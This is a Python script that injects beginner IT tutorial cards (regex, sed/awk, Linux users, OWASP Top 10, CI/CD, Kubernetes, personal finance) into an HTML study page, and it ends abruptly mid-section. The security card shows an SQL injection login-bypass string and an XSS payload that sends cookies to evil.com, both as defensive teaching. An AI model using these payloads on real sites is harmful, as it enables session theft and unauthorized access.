#!/usr/bin/env python3
"""
patch_beginner_concepts_v12.py — Wave 12: Cloud security, Kubernetes intro,
advanced Linux admin, regex mastery, and final life/career content.

New sentinels:
  BEGINNER12-SCRIPT v1  — Regex deep dive, string processing patterns
  BEGINNER12-LINUX v1   — Advanced file operations, AWK/sed, user management
  BEGINNER12-SEC v1     — Cloud security basics, OWASP Top 10 web vulnerabilities
  BEGINNER12-OPS v1     — Kubernetes basics, CI/CD concepts, DevSecOps
  BEGINNER12-LIFE v1    — Financial basics for IT workers, remote work, work-life balance
"""
from pathlib import Path

SCRIPT_INJECT_ANCHOR = "<!-- /domain-body script -->"
LINUX_INJECT_ANCHOR  = "<!-- /domain-body linux -->"
SEC_INJECT_ANCHOR    = "<!-- /domain-body sec -->"
OPS_INJECT_ANCHOR    = "<!-- /domain-body ops -->"
LIFE_INJECT_ANCHOR   = "<!-- /domain-body lifestyle -->"

# ─────────────────────────────── SCRIPTING wave 12 ───────────────────────────
SCRIPT_SENTINEL = "<!-- BEGINNER12-SCRIPT v1 -->"
SCRIPT_CONTENT = """
<!-- BEGINNER12-SCRIPT v1 -->
<!-- ── TOPIC: REGEX MASTERY ─────────────────────────────── -->
<div class="topic">
  <div class="topic-header">
    <span class="topic-icon">🔎</span>
    <span class="topic-name">Regular Expressions — Pattern Matching Power</span>
    <span class="topic-badge">SCRIPT • Practical</span>
    <span class="topic-chevron">›</span>
  </div>
  <div class="topic-body">
    <div class="concept-card">
      <div class="concept-label">THE BUILDING BLOCKS</div>
      <div class="concept-title">Meta-Characters Reference</div>
      <table class="ai-table">
        <thead><tr><th>Pattern</th><th>Matches</th><th>Example</th></tr></thead>
        <tbody>
          <tr><td>.</td><td>Any character except newline</td><td><code>a.c</code> → "abc", "a1c", "a-c"</td></tr>
          <tr><td>^</td><td>Start of string</td><td><code>^Hello</code> → "Hello world"</td></tr>
          <tr><td>$</td><td>End of string</td><td><code>world$</code> → "hello world"</td></tr>
          <tr><td>*</td><td>0 or more of previous</td><td><code>ab*c</code> → "ac", "abc", "abbc"</td></tr>
          <tr><td>+</td><td>1 or more of previous</td><td><code>ab+c</code> → "abc", "abbc" (not "ac")</td></tr>
          <tr><td>?</td><td>0 or 1 of previous (optional)</td><td><code>colou?r</code> → "color", "colour"</td></tr>
          <tr><td>{n,m}</td><td>Between n and m repetitions</td><td><code>\d{3,5}</code> → "123", "1234", "12345"</td></tr>
          <tr><td>[abc]</td><td>Character class (a, b, or c)</td><td><code>[aeiou]</code> matches any vowel</td></tr>
          <tr><td>[^abc]</td><td>NOT a, b, or c</td><td><code>[^0-9]</code> matches non-digit</td></tr>
          <tr><td>\d</td><td>Digit [0-9]</td><td><code>\d+</code> → one or more digits</td></tr>
          <tr><td>\w</td><td>Word char [a-zA-Z0-9_]</td><td><code>\w+</code> → word</td></tr>
          <tr><td>\s</td><td>Whitespace</td><td><code>\s+</code> → spaces, tabs, newlines</td></tr>
          <tr><td>\b</td><td>Word boundary</td><td><code>\bcat\b</code> won't match "concatenate"</td></tr>
          <tr><td>(group)</td><td>Capture group</td><td><code>(\d{4})-(\d{2})</code> captures year, month</td></tr>
          <tr><td>a|b</td><td>a or b</td><td><code>cat|dog</code> → "cat" or "dog"</td></tr>
        </tbody>
      </table>
    </div>
    <div class="concept-card">
      <div class="concept-label">PYTHON RE MODULE</div>
      <div class="concept-title">Core Functions</div>
      <div class="code-block"><span class="kw">import</span> re

text = <span class="str">"Call 555-123-4567 or email alice@example.com today!"</span>

<span class="com"># search — find first match anywhere in string</span>
m = re.search(<span class="str">r'\d{3}-\d{3}-\d{4}'</span>, text)
<span class="kw">if</span> m:
    <span class="fn">print</span>(m.group())      <span class="com"># "555-123-4567"</span>
    <span class="fn">print</span>(m.start(), m.end())  <span class="com"># position</span>

<span class="com"># findall — return list of all matches</span>
phones = re.findall(<span class="str">r'\d{3}-\d{3}-\d{4}'</span>, text)

<span class="com"># match — only matches at START of string</span>
m = re.match(<span class="str">r'Call'</span>, text)  <span class="com"># matches</span>
m = re.match(<span class="str">r'email'</span>, text) <span class="com"># no match (not at start)</span>

<span class="com"># sub — replace matches</span>
redacted = re.sub(<span class="str">r'\d{3}-\d{3}-\d{4}'</span>, <span class="str">'[PHONE]'</span>, text)
<span class="com"># "Call [PHONE] or email alice@example.com today!"</span>

<span class="com"># compile for performance (reuse pattern)</span>
phone_re = re.compile(<span class="str">r'\d{3}-\d{3}-\d{4}'</span>)
phones = phone_re.findall(big_text)</div>
    </div>
    <div class="concept-card">
      <div class="concept-label">CAPTURE GROUPS</div>
      <div class="concept-title">Extract Specific Parts of a Match</div>
      <div class="code-block"><span class="kw">import</span> re

log_line = <span class="str">"2024-01-15 09:23:41 ERROR user_service: login failed for alice"</span>

<span class="com"># Named groups — easier to read than numbers</span>
pattern = re.compile(
    <span class="str">r'(?P&lt;date&gt;\d{4}-\d{2}-\d{2}) (?P&lt;time&gt;\d{2}:\d{2}:\d{2}) '</span>
    <span class="str">r'(?P&lt;level&gt;\w+) (?P&lt;service&gt;\S+): (?P&lt;message&gt;.*)'</span>
)

m = pattern.match(log_line)
<span class="kw">if</span> m:
    <span class="fn">print</span>(m.group(<span class="str">"date"</span>))     <span class="com"># 2024-01-15</span>
    <span class="fn">print</span>(m.group(<span class="str">"level"</span>))    <span class="com"># ERROR</span>
    <span class="fn">print</span>(m.group(<span class="str">"message"</span>))  <span class="com"># login failed for alice</span>
    <span class="fn">print</span>(m.groupdict())         <span class="com"># all groups as dict</span></div>
    </div>
    <div class="concept-card">
      <div class="concept-label">PRACTICAL PATTERNS</div>
      <div class="concept-title">Patterns You'll Use Often</div>
      <div class="code-block"><span class="com"># Email validation (simplified — perfect email regex is insane)</span>
email_re = re.compile(<span class="str">r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'</span>)

<span class="com"># IPv4 address</span>
ipv4_re = re.compile(<span class="str">r'\b(?:\d{1,3}\.){3}\d{1,3}\b'</span>)

<span class="com"># URL extraction</span>
url_re = re.compile(<span class="str">r'https?://[^\s]+'</span>)

<span class="com"># US phone number (various formats)</span>
phone_re = re.compile(<span class="str">r'\(?\d{3}\)?[-.\s]\d{3}[-.\s]\d{4}'</span>)

<span class="com"># Strip HTML tags</span>
tag_re = re.compile(<span class="str">r'&lt;[^&gt;]+&gt;'</span>)
clean = tag_re.sub(<span class="str">''</span>, html_string)</div>
    </div>
    <div class="concept-card">
      <div class="concept-label">FLAGS</div>
      <div class="concept-title">Modify Matching Behavior</div>
      <div class="code-block"><span class="com"># re.IGNORECASE — case-insensitive matching</span>
re.findall(<span class="str">r'error'</span>, log, re.IGNORECASE)

<span class="com"># re.MULTILINE — ^ and $ match line boundaries</span>
re.findall(<span class="str">r'^\d+'</span>, text, re.MULTILINE)

<span class="com"># re.DOTALL — . matches newlines too</span>
re.search(<span class="str">r'start.*end'</span>, multiline_text, re.DOTALL)

<span class="com"># re.VERBOSE — allows comments and whitespace</span>
phone_re = re.compile(<span class="str">r&quot;&quot;&quot;
    \(?        # optional opening paren
    (\d{3})    # area code
    \)?        # optional closing paren
    [-.\s]?    # separator
    (\d{3})    # exchange
    [-.\s]?    # separator
    (\d{4})    # number
&quot;&quot;&quot;</span>, re.VERBOSE)</div>
    </div>
  </div>
</div>

<!-- ── TOPIC: STRING PROCESSING PATTERNS ─────────────────── -->
<div class="topic">
  <div class="topic-header">
    <span class="topic-icon">📝</span>
    <span class="topic-name">String Processing — Text Manipulation Toolkit</span>
    <span class="topic-badge">SCRIPT • Practical</span>
    <span class="topic-chevron">›</span>
  </div>
  <div class="topic-body">
    <div class="concept-card">
      <div class="concept-label">ESSENTIAL STRING METHODS</div>
      <div class="concept-title">Python String API Cheatsheet</div>
      <div class="code-block">s = <span class="str">"  Hello, World!  "</span>

<span class="com"># Cleaning</span>
s.strip()              <span class="com"># "Hello, World!"  (removes whitespace)</span>
s.lstrip()             <span class="com"># "Hello, World!  "</span>
s.rstrip()             <span class="com"># "  Hello, World!"</span>

<span class="com"># Case</span>
s.upper()              <span class="com"># "  HELLO, WORLD!  "</span>
s.lower()              <span class="com"># "  hello, world!  "</span>
s.title()              <span class="com"># "  Hello, World!  "</span>

<span class="com"># Search</span>
s.find(<span class="str">"World"</span>)        <span class="com"># 9 (index) or -1 if not found</span>
s.count(<span class="str">"l"</span>)           <span class="com"># 3</span>
s.startswith(<span class="str">"  He"</span>)  <span class="com"># True</span>
s.endswith(<span class="str">"!  "</span>)    <span class="com"># True</span>

<span class="com"># Modify</span>
s.replace(<span class="str">"World"</span>, <span class="str">"Python"</span>)
s.strip().split(<span class="str">", "</span>)  <span class="com"># ["Hello", "World!"]</span>

<span class="com"># Join (inverse of split)</span>
<span class="str">", "</span>.join([<span class="str">"a"</span>, <span class="str">"b"</span>, <span class="str">"c"</span>])  <span class="com"># "a, b, c"</span>

<span class="com"># Format</span>
name = <span class="str">"Alice"</span>
<span class="str">f"Hello, {name}!"</span>               <span class="com"># f-string (Python 3.6+)</span>
<span class="str">"Hello, {}!".format(name)</span>       <span class="com"># .format()</span>
<span class="str">"Hello, %s!" % name</span>             <span class="com"># old %-style</span></div>
    </div>
    <div class="concept-card">
      <div class="concept-label">F-STRING TRICKS</div>
      <div class="concept-title">Format Numbers and Debug</div>
      <div class="code-block">pi = <span class="num">3.14159265</span>
big = <span class="num">1234567890</span>
score = <span class="num">0.8756</span>

<span class="fn">print</span>(<span class="str">f"{pi:.2f}"</span>)         <span class="com"># 3.14   (2 decimal places)</span>
<span class="fn">print</span>(<span class="str">f"{big:,}"</span>)           <span class="com"># 1,234,567,890 (thousands sep)</span>
<span class="fn">print</span>(<span class="str">f"{score:.1%}"</span>)       <span class="com"># 87.6%  (percentage)</span>
<span class="fn">print</span>(<span class="str">f"{big:#010x}"</span>)       <span class="com"># 0x499602d2 (hex)</span>
<span class="fn">print</span>(<span class="str">f"{'center':^20}"</span>)    <span class="com"># "      center       " (center pad)</span>

<span class="com"># Debug mode (Python 3.8+) — print name = value</span>
x = <span class="num">42</span>
<span class="fn">print</span>(<span class="str">f"{x=}"</span>)              <span class="com"># x=42</span>
<span class="fn">print</span>(<span class="str">f"{x*2=}"</span>)            <span class="com"># x*2=84</span></div>
    </div>
  </div>
</div>
"""

# ─────────────────────────────── LINUX wave 12 ───────────────────────────────
LINUX_SENTINEL = "<!-- BEGINNER12-LINUX v1 -->"
LINUX_CONTENT = """
<!-- BEGINNER12-LINUX v1 -->
<!-- ── TOPIC: AWK, SED, AND TEXT PROCESSING ─────────────── -->
<div class="topic">
  <div class="topic-header">
    <span class="topic-icon">✂️</span>
    <span class="topic-name">AWK &amp; sed — The Text Processing Powerhouses</span>
    <span class="topic-badge">LINUX • Power Tools</span>
    <span class="topic-chevron">›</span>
  </div>
  <div class="topic-body">
    <div class="concept-card">
      <div class="concept-label">SED</div>
      <div class="concept-title">Stream Editor — Find and Replace on Steroids</div>
      <div class="code-block"><span class="com"># Basic substitution (first occurrence per line)</span>
sed <span class="str">'s/old/new/'</span> file.txt

<span class="com"># Global (all occurrences)</span>
sed <span class="str">'s/old/new/g'</span> file.txt

<span class="com"># In-place edit (BACKUP FIRST!)</span>
sed -i <span class="str">'s/localhost/192.168.1.5/g'</span> config.txt
sed -i.bak <span class="str">'s/localhost/192.168.1.5/g'</span> config.txt  <span class="com"># with .bak backup</span>

<span class="com"># Delete lines matching pattern</span>
sed <span class="str">'/^#/d'</span> config.txt     <span class="com"># remove comment lines</span>
sed <span class="str">'/^$/d'</span> file.txt       <span class="com"># remove empty lines</span>

<span class="com"># Print specific line numbers</span>
sed -n <span class="str">'10,20p'</span> file.txt   <span class="com"># lines 10-20</span>

<span class="com"># Insert text before/after line</span>
sed <span class="str">'5i\\New line above'</span> file.txt   <span class="com"># insert before line 5</span>
sed <span class="str">'5a\\New line below'</span> file.txt   <span class="com"># append after line 5</span></div>
    </div>
    <div class="concept-card">
      <div class="concept-label">AWK</div>
      <div class="concept-title">Field-Based Text Processing</div>
      <div class="concept-desc">AWK processes text line-by-line, splitting each line into fields ($1, $2, ..., $NF = last field). Powerful for structured text like logs and CSV files.</div>
      <div class="code-block"><span class="com"># Print specific columns from a log</span>
awk <span class="str">'{print $1, $4}'</span> access.log     <span class="com"># IP and timestamp</span>

<span class="com"># Sum the 5th column</span>
awk <span class="str">'{sum += $5} END {print "Total:", sum}'</span> data.txt

<span class="com"># Filter: print lines where 3rd field &gt; 1000</span>
awk <span class="str">'$3 &gt; 1000 {print $0}'</span> data.txt

<span class="com"># Print with custom delimiter</span>
awk -F<span class="str">':'</span> <span class="str">'{print $1, $6}'</span> /etc/passwd   <span class="com"># username, home dir</span>

<span class="com"># Count unique values in column 1</span>
awk <span class="str">'{count[$1]++} END {for (k in count) print count[k], k}'</span> log.txt \
  | sort -rn | head -10

<span class="com"># Process CSV: print name,email from CSV with header</span>
awk -F<span class="str">','</span> <span class="str">'NR &gt; 1 {print $2, $3}'</span> users.csv</div>
    </div>
    <div class="concept-card">
      <div class="concept-label">CUT, SORT, UNIQ</div>
      <div class="concept-title">The Classic Pipeline Trio</div>
      <div class="code-block"><span class="com"># cut: extract columns by delimiter</span>
cut -d<span class="str">':'</span> -f1,3 /etc/passwd      <span class="com"># username and UID</span>
cut -d<span class="str">','</span> -f1,2 data.csv          <span class="com"># first two CSV columns</span>

<span class="com"># sort: alphabetically or numerically</span>
sort names.txt                     <span class="com"># A-Z</span>
sort -r names.txt                  <span class="com"># Z-A</span>
sort -n numbers.txt                <span class="com"># numeric sort</span>
sort -t<span class="str">':'</span> -k3 -n /etc/passwd     <span class="com"># sort by 3rd field numerically</span>
sort -u names.txt                  <span class="com"># sort and remove duplicates</span>

<span class="com"># uniq: collapse adjacent duplicate lines</span>
sort log.txt | uniq                <span class="com"># must sort first!</span>
sort log.txt | uniq -c             <span class="com"># count occurrences</span>
sort log.txt | uniq -d             <span class="com"># only show duplicates</span>

<span class="com"># Classic combo: most common IPs in access log</span>
awk <span class="str">'{print $1}'</span> access.log | sort | uniq -c | sort -rn | head -20</div>
    </div>
  </div>
</div>

<!-- ── TOPIC: USER & GROUP MANAGEMENT ────────────────────── -->
<div class="topic">
  <div class="topic-header">
    <span class="topic-icon">👥</span>
    <span class="topic-name">User &amp; Group Management — Who Can Do What in Linux</span>
    <span class="topic-badge">LINUX • Admin</span>
    <span class="topic-chevron">›</span>
  </div>
  <div class="topic-body">
    <div class="concept-card">
      <div class="concept-label">USERS & GROUPS</div>
      <div class="concept-title">The Linux Identity Model</div>
      <div class="concept-desc">Every file and process has an owner (user) and a group. Permissions are set for: owner, group, and everyone else. UID 0 is root — the superuser with no restrictions. UIDs below 1000 are typically system accounts; 1000+ are human users.</div>
    </div>
    <div class="concept-card">
      <div class="concept-label">USER MANAGEMENT COMMANDS</div>
      <div class="concept-title">Create, Modify, Delete</div>
      <div class="code-block"><span class="com"># Create user</span>
sudo useradd -m -s /bin/bash alice     <span class="com"># -m creates home, -s sets shell</span>
sudo useradd -r -s /usr/sbin/nologin svc  <span class="com"># system account, no login</span>

<span class="com"># Set/change password</span>
sudo passwd alice

<span class="com"># Modify user</span>
sudo usermod -aG sudo alice            <span class="com"># add to sudo group</span>
sudo usermod -s /bin/zsh alice         <span class="com"># change shell</span>
sudo usermod -L alice                  <span class="com"># lock account</span>
sudo usermod -U alice                  <span class="com"># unlock account</span>

<span class="com"># Delete user</span>
sudo userdel alice                     <span class="com"># keep home dir</span>
sudo userdel -r alice                  <span class="com"># also remove home dir</span>

<span class="com"># View user info</span>
id alice                               <span class="com"># UID, GID, groups</span>
groups alice                           <span class="com"># group memberships</span>
finger alice                           <span class="com"># detailed info (if installed)</span>
who                                    <span class="com"># who is currently logged in</span>
last alice                             <span class="com"># login history</span></div>
    </div>
    <div class="concept-card">
      <div class="concept-label">SUDO</div>
      <div class="concept-title">Controlled Privilege Escalation</div>
      <div class="concept-desc"><code>sudo</code> lets authorized users run commands as root (or another user) without knowing root's password. The <code>/etc/sudoers</code> file controls who can use sudo and what they can run. Always edit with <code>visudo</code> — it validates syntax before saving (a broken sudoers file locks you out).</div>
      <div class="code-block"><span class="com"># Common sudoers entries (in /etc/sudoers)</span>
alice    ALL=(ALL:ALL) ALL             <span class="com"># full sudo</span>
bob      ALL=(ALL) NOPASSWD: /bin/systemctl restart nginx   <span class="com"># one command only</span>
%ops     ALL=(ALL:ALL) ALL             <span class="com"># entire group ops</span>

<span class="com"># Check what you can run</span>
sudo -l

<span class="com"># Run as different user</span>
sudo -u www-data whoami</div>
    </div>
  </div>
</div>
"""

# ─────────────────────────────── SEC wave 12 ─────────────────────────────────
SEC_SENTINEL = "<!-- BEGINNER12-SEC v1 -->"
SEC_CONTENT = """
<!-- BEGINNER12-SEC v1 -->
<!-- ── TOPIC: OWASP TOP 10 WEB VULNERABILITIES ───────────── -->
<div class="topic">
  <div class="topic-header">
    <span class="topic-icon">🕸️</span>
    <span class="topic-name">OWASP Top 10 — The Most Critical Web Security Risks</span>
    <span class="topic-badge">SEC • Essential</span>
    <span class="topic-chevron">›</span>
  </div>
  <div class="topic-body">
    <div class="concept-card">
      <div class="concept-label">WHAT IS OWASP</div>
      <div class="concept-title">Open Web Application Security Project</div>
      <div class="concept-desc">OWASP is a nonprofit foundation that publishes the Top 10 — a consensus list of the most critical web application security risks, updated every few years based on real-world data. Every web developer and security professional should know these by heart.</div>
    </div>
    <table class="ai-table">
      <thead><tr><th>#</th><th>Risk</th><th>Example Attack</th><th>Prevention</th></tr></thead>
      <tbody>
        <tr><td>A01</td><td>Broken Access Control</td><td>Changing URL param to access another user's data</td><td>Enforce authorization server-side for every request</td></tr>
        <tr><td>A02</td><td>Cryptographic Failures</td><td>HTTP instead of HTTPS; MD5 password hashes</td><td>TLS everywhere; bcrypt for passwords; AES-256 for data</td></tr>
        <tr><td>A03</td><td>Injection (SQLi, XSS, etc.)</td><td><code>' OR '1'='1</code> in login field</td><td>Parameterized queries; input validation; output encoding</td></tr>
        <tr><td>A04</td><td>Insecure Design</td><td>No rate limiting; predictable reset tokens</td><td>Threat modeling; security requirements from day 1</td></tr>
        <tr><td>A05</td><td>Security Misconfiguration</td><td>Default creds; debug mode in prod; open S3 buckets</td><td>Hardening guides; IaC with security checks; scan configs</td></tr>
        <tr><td>A06</td><td>Vulnerable Components</td><td>Log4Shell; Heartbleed; npm package with malware</td><td>Inventory dependencies; Dependabot; SCA scanning</td></tr>
        <tr><td>A07</td><td>Auth Failures</td><td>Brute force; credential stuffing; weak passwords</td><td>MFA; account lockout; breached password checks</td></tr>
        <tr><td>A08</td><td>Software Integrity Failures</td><td>CI/CD pipeline compromise; insecure deserialization</td><td>Code signing; trusted registries; verify checksums</td></tr>
        <tr><td>A09</td><td>Logging &amp; Monitoring Failures</td><td>Attack goes undetected for months</td><td>Centralized logging; SIEM alerts; test detection</td></tr>
        <tr><td>A10</td><td>SSRF</td><td>User-supplied URL fetched by server → internal services exposed</td><td>Allowlist URLs; block RFC-1918 addresses</td></tr>
      </tbody>
    </table>
    <div class="concept-card">
      <div class="concept-label">SQL INJECTION DEEP DIVE</div>
      <div class="concept-title">The Most Classic Vulnerability</div>
      <div class="concept-desc">SQL injection lets an attacker insert SQL commands into a query. If a login form does:</div>
      <div class="code-block"><span class="com"># VULNERABLE — NEVER DO THIS</span>
query = <span class="str">f"SELECT * FROM users WHERE name='{username}' AND password='{password}'"</span>

<span class="com"># If username = "' OR '1'='1'; -- "</span>
<span class="com"># Query becomes: SELECT * FROM users WHERE name='' OR '1'='1'; --'</span>
<span class="com"># The -- comments out rest; '1'='1' is always true → login without password!</span>

<span class="com"># CORRECT — Parameterized query (Python sqlite3)</span>
cursor.execute(<span class="str">"SELECT * FROM users WHERE name=? AND password=?"</span>,
               (username, password_hash))
<span class="com"># Parameters are treated as DATA, never as SQL code</span></div>
    </div>
    <div class="concept-card">
      <div class="concept-label">XSS</div>
      <div class="concept-title">Cross-Site Scripting — Injecting JavaScript</div>
      <div class="concept-desc">XSS lets attackers inject malicious JavaScript into web pages that other users see. If you display unsanitized user input in HTML, an attacker submits <code>&lt;script&gt;document.location='https://evil.com?c='+document.cookie&lt;/script&gt;</code> and steals every visitor's session cookie.<br>
      <strong>Prevention</strong>: always HTML-encode output. In Python Jinja2: <code>{{ user_input }}</code> auto-escapes. Never use <code>{{ user_input|safe }}</code> unless you're absolutely sure it's clean. Use Content Security Policy (CSP) headers.</div>
    </div>
  </div>
</div>
"""

# ─────────────────────────────── OPS wave 12 ─────────────────────────────────
OPS_SENTINEL = "<!-- BEGINNER12-OPS v1 -->"
OPS_CONTENT = """
<!-- BEGINNER12-OPS v1 -->
<!-- ── TOPIC: CI/CD CONCEPTS ─────────────────────────────── -->
<div class="topic">
  <div class="topic-header">
    <span class="topic-icon">🔄</span>
    <span class="topic-name">CI/CD — Automate the Path From Code to Production</span>
    <span class="topic-badge">OPS • DevOps</span>
    <span class="topic-chevron">›</span>
  </div>
  <div class="topic-body">
    <div class="concept-card">
      <div class="concept-label">WHAT IS CI/CD</div>
      <div class="concept-title">Continuous Integration / Continuous Delivery</div>
      <div class="concept-desc"><strong>CI (Continuous Integration)</strong>: every code change is automatically built and tested. Developers merge frequently; the pipeline catches bugs within minutes.<br>
      <strong>CD (Continuous Delivery)</strong>: every successful build is automatically deployable to production (but a human approves the push).<br>
      <strong>CD (Continuous Deployment)</strong>: every successful build is automatically pushed to production without human approval. Used by companies doing many deploys per day.</div>
    </div>
    <div class="concept-card">
      <div class="concept-label">TYPICAL PIPELINE STAGES</div>
      <div class="concept-title">Code → Test → Build → Deploy</div>
      <table class="ai-table">
        <thead><tr><th>Stage</th><th>What Happens</th><th>Tool Examples</th></tr></thead>
        <tbody>
          <tr><td>Source</td><td>Code pushed to repo triggers pipeline</td><td>GitHub, GitLab, Bitbucket</td></tr>
          <tr><td>Lint &amp; Static Analysis</td><td>Code style, type checks, SAST</td><td>flake8, mypy, SonarQube, Semgrep</td></tr>
          <tr><td>Unit Tests</td><td>Test individual functions</td><td>pytest, JUnit, Jest</td></tr>
          <tr><td>Integration Tests</td><td>Test components together</td><td>pytest with test DBs, Postman</td></tr>
          <tr><td>Build / Package</td><td>Compile, build Docker image, package</td><td>Docker, maven, npm build</td></tr>
          <tr><td>Security Scan</td><td>Dependency vulnerabilities, image scan</td><td>Trivy, Snyk, pip-audit</td></tr>
          <tr><td>Deploy to Staging</td><td>Deploy to production-like env</td><td>Kubernetes, Terraform, Ansible</td></tr>
          <tr><td>E2E Tests</td><td>Test full user workflows</td><td>Playwright, Selenium, Cypress</td></tr>
          <tr><td>Deploy to Production</td><td>Roll out to real users</td><td>k8s rolling update, blue/green</td></tr>
        </tbody>
      </table>
    </div>
    <div class="concept-card">
      <div class="concept-label">GITHUB ACTIONS</div>
      <div class="concept-title">Basic CI Workflow</div>
      <div class="code-block"><span class="com"># .github/workflows/ci.yml</span>
name: CI

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: <span class="str">"3.12"</span>

      - name: Install dependencies
        run: |
          pip install -r requirements.txt
          pip install pytest pytest-cov

      - name: Run tests
        run: pytest --cov=src --cov-report=xml

      - name: Security scan
        run: pip-audit</div>
    </div>
    <div class="concept-card">
      <div class="concept-label">DEVSECOPS</div>
      <div class="concept-title">Security Shifted Left</div>
      <div class="concept-desc">DevSecOps integrates security checks into every stage of the CI/CD pipeline — not as a gate at the end ("is this ready to ship?") but as automated checks throughout:<br>
      • <strong>SAST</strong> (Static Application Security Testing) — analyze code for vulnerabilities<br>
      • <strong>DAST</strong> (Dynamic Application Security Testing) — attack the running app<br>
      • <strong>SCA</strong> (Software Composition Analysis) — scan dependencies for CVEs<br>
      • <strong>IaC scanning</strong> — check Terraform/CloudFormation for misconfigurations<br>
      "Shift left" = catch vulnerabilities when they're cheap to fix (in development), not expensive (in production).</div>
    </div>
  </div>
</div>

<!-- ── TOPIC: KUBERNETES FUNDAMENTALS ────────────────────── -->
<div class="topic">
  <div class="topic-header">
    <span class="topic-icon">☸️</span>
    <span class="topic-name">Kubernetes — Container Orchestration at Scale</span>
    <span class="topic-badge">OPS • Cloud Native</span>
    <span class="topic-chevron">›</span>
  </div>
  <div class="topic-body">
    <div class="concept-card">
      <div class="concept-label">WHAT IS KUBERNETES</div>
      <div class="concept-title">Run, Scale, and Heal Containers Automatically</div>
      <div class="concept-desc">Kubernetes (k8s) is a container orchestration platform. You tell it "I want 5 replicas of my web container running at all times." k8s does the scheduling (which node to run it on), restarts failed containers, scales up/down based on load, and manages networking between services. Originally from Google; now the de-facto cloud standard.</div>
    </div>
    <div class="concept-card">
      <div class="concept-label">CORE OBJECTS</div>
      <div class="concept-title">Pod → Deployment → Service → Ingress</div>
      <div class="concept-desc"><strong>Pod</strong> — smallest deployable unit; one or more containers sharing a network namespace and storage. Ephemeral — can die and be replaced.<br>
      <strong>Deployment</strong> — manages N replicas of a Pod; handles rolling updates and rollbacks.<br>
      <strong>Service</strong> — stable network endpoint that load-balances traffic to pods (pods have dynamic IPs; Services don't change).<br>
      <strong>Ingress</strong> — HTTP/HTTPS routing: <code>example.com/api → api-service, example.com/ → frontend-service</code>.<br>
      <strong>ConfigMap / Secret</strong> — inject config and secrets into pods as env vars or files.</div>
    </div>
    <div class="concept-card">
      <div class="concept-label">KUBECTL BASICS</div>
      <div class="concept-title">The k8s CLI</div>
      <div class="code-block"><span class="com"># See what's running</span>
kubectl get pods
kubectl get pods -n kube-system     <span class="com"># in a specific namespace</span>
kubectl get all                     <span class="com"># pods, services, deployments</span>

<span class="com"># Inspect resources</span>
kubectl describe pod my-pod-abc123
kubectl logs my-pod-abc123
kubectl logs -f my-pod-abc123       <span class="com"># follow</span>

<span class="com"># Get a shell in a running pod</span>
kubectl exec -it my-pod-abc123 -- bash

<span class="com"># Apply a manifest file</span>
kubectl apply -f deployment.yaml

<span class="com"># Scale</span>
kubectl scale deployment myapp --replicas=5

<span class="com"># Rolling update</span>
kubectl set image deployment/myapp myapp=myimage:v2

<span class="com"># Rollback</span>
kubectl rollout undo deployment/myapp</div>
    </div>
    <div class="concept-card">
      <div class="concept-label">WHEN TO USE K8S</div>
      <div class="concept-title">It's Powerful But Complex</div>
      <div class="concept-desc">Kubernetes adds significant operational complexity. For a small startup with one app: Docker Compose or a single managed service (Heroku, Railway, Fly.io) is simpler and faster to operate. k8s shines when you have: many services, need to scale services independently, have a team to manage it, or require advanced deployment strategies (canary, blue/green). "Kubernetes because it's cool" is not a good reason.</div>
    </div>
  </div>
</div>
"""

# ─────────────────────────────── LIFESTYLE wave 12 ───────────────────────────
LIFE_SENTINEL = "<!-- BEGINNER12-LIFE v1 -->"
LIFE_CONTENT = """
<!-- BEGINNER12-LIFE v1 -->
<!-- ── TOPIC: FINANCIAL BASICS FOR IT WORKERS ────────────── -->
<div class="topic">
  <div class="topic-header">
    <span class="topic-icon">💰</span>
    <span class="topic-name">Financial Basics for IT Workers — Build While You Build a Career</span>
    <span class="topic-badge">LIFESTYLE • Life Skills</span>
    <span class="topic-chevron">›</span>
  </div>
  <div class="topic-body">
    <div class="concept-card">
      <div class="concept-label">THE BIG PRINCIPLE</div>
      <div class="concept-title">Pay Yourself First, Automate It</div>
      <div class="concept-desc">IT salaries are strong relative to many fields — but income doesn't build wealth; <em>savings rate</em> does. The person earning $70k who saves 20% builds wealth faster than the person earning $150k who spends it all. Automate savings so it leaves your account before you have a chance to spend it.</div>
    </div>
    <div class="concept-card">
      <div class="concept-label">PRIORITY ORDER</div>
      <div class="concept-title">Where to Put Money First</div>
      <div class="concept-desc">1. <strong>Emergency fund</strong> — 3-6 months of expenses in a HYSA (High Yield Savings Account). Prevents one bad month from derailing everything.<br>
      2. <strong>401k up to employer match</strong> — it's 50-100% instant return on investment. Never leave free money on the table.<br>
      3. <strong>High-interest debt</strong> — pay off credit cards (&gt;7% interest) before investing further.<br>
      4. <strong>IRA (Roth if eligible)</strong> — tax-advantaged; grows tax-free.<br>
      5. <strong>Max 401k</strong> — $23k/year limit (2024); reduces taxable income.<br>
      6. <strong>Taxable brokerage</strong> — invest the rest.</div>
    </div>
    <div class="concept-card">
      <div class="concept-label">INVESTING BASICS</div>
      <div class="concept-title">Simple Beats Clever</div>
      <div class="concept-desc">The overwhelming evidence: low-cost index funds (total market, S&amp;P 500) outperform most actively managed funds over 10+ years, after fees. You don't need to pick stocks. A three-fund portfolio (US stocks, international stocks, bonds) in a Vanguard/Fidelity/Schwab account beats most "sophisticated" strategies.<br>
      <strong>The Bogleheads approach</strong>: buy, hold, rebalance annually, never panic-sell. Time in the market beats timing the market.</div>
    </div>
    <div class="concept-card">
      <div class="concept-label">IT-SPECIFIC FINANCIAL TIPS</div>
      <div class="concept-title">Leverage Your Field</div>
      <div class="concept-desc">• <strong>Remote work</strong> means geographic arbitrage — earn city salary while living somewhere cheaper.<br>
      • <strong>Negotiate everything</strong> — IT salaries have wide ranges. The person who asks for $20k more often gets $15k more. Research Glassdoor, Levels.fyi, LinkedIn Salary before every offer.<br>
      • <strong>RSUs and stock options</strong> — know when your grants vest and have a plan to diversify. Don't hold too much of one company's stock.<br>
      • <strong>Education benefits</strong> — many employers pay for certifications. Don't pay out of pocket if your employer will pay.</div>
    </div>
  </div>
</div>

<!-- ── TOPIC: REMOTE WORK & WORK-LIFE BALANCE ─────────────── -->
<div class="topic">
  <div class="topic-header">
    <span class="topic-icon">🏡</span>
    <span class="topic-name">Remote Work — Working Well From Anywhere</span>
    <span class="topic-badge">LIFESTYLE • Modern Work</span>
    <span class="topic-chevron">›</span>
  </div>
  <div class="topic-body">
